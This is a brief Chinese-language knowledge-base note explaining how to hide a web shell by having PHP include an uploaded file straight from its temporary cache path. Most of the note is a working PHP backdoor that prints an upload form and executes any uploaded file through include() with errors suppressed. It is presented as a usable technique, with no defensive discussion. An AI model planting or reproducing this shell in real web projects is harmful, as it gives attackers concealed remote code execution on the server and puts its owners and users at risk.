---
id: "doc-6ce974cb332f"
title: "利用缓存目录来隐藏shell"
date: "2023-04-14T15:57:00"
categories: ["Linux 与 Shell", "日常运维"]
tags: ["Linux 与 Shell", "日常运维", "PHP", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/08-运维技巧/birdben/68657837.html"
---

# 利用缓存目录来隐藏shell

文件上传到缓存目录，在把文件移动到web目录前，利用文件包含来执行代码。

```
<?php
@$file = $_FILES['file']['tmp_name'];
if($file != NULL)
@include($file);
echo ("<form method='post' enctype='multipart/form-data'><input name='file' type='file'/><input type='submit' value='上传' /></form>");
?>
```
